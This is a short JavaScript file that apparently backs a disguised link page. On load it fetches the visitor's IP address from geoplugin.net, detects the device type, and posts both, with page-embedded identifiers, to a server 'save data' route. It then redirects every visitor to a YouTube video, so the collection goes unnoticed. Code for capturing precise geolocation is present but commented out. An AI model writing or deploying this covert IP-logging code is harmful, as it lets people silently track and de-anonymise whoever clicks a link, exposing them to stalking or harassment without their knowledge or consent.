var coderror = "Success";
var latitude = 0;
var longitude = 0;
var plataforma = "";
var Ipdis = "";
$(document).ready(function() {
    Ipdis = getIp();

    plataforma = getPlatformType();
    // if (navigator.geolocation) {
    //     var tiempo_de_espera = 3000;
    //     navigator.geolocation.getCurrentPosition(
    //         mostrarCoordenadas, mostrarError, {
    //             enableHighAccuracy: true,
    //             timeout: tiempo_de_espera,
    //             maximumAge: 0
    //         });
    // } else {
    guardar();
    // }


});


async function getIp() {
    var ip;
    await $.getJSON('http://www.geoplugin.net/json.gp?jsoncallback=?', function(data) {
        //var datitosClient = JSON.stringify(data, null, 2);
        ip = data['geoplugin_request'];
        Ipdis = ip;
        guardar();
    });
    return ip;
}

function getPlatformType() {
    if (navigator.userAgent.match(/mobile/i)) {
        return 'Mobile';
    } else if (navigator.userAgent.match(/iPad|Android|Touch/i)) {
        return 'Tablet';
    } else {
        return 'Desktop';
    }
}


// function mostrarCoordenadas(position) {
//     latitude = position.coords.latitude;
//     longitude = position.coords.longitude;
//     guardar();
// }

// function mostrarError(error) {
//     var errores = { 1: 'Permiso denegado', 2: 'Posición no disponible', 3: 'Expiró el tiempo de respuesta' };
//     coderror = errores[error.code];
//     guardar();
// }

function guardar() {
    //var ip = await getIp();
    $.ajax({
        url: "./?r=index/gurdarDatos",
        async: false,
        data: {
            "idphpTipo": $("#idphpTipo").html(),
            "plataforma": plataforma,
            "Ipdis": Ipdis,
            "latitude": latitude,
            "longitude": longitude,
            "dataadd": $("#idphp").html(),
            "coderror": coderror,
        },
        type: "POST",
        success: function(data) {
            if (data.success == true) {

                location.href = "https://www.youtube.com/watch?v=z19DmR3y2nw";
            } else {
                location.href = "https://www.youtube.com/watch?v=z19DmR3y2nw";
            }

        },
        beforeSend: function(objeto) {


        },
        error: function(xhr, ajaxOptions, thrownError) {
            location.href = "https://www.youtube.com/watch?v=z19DmR3y2nw";
        }
    });
    return false;
}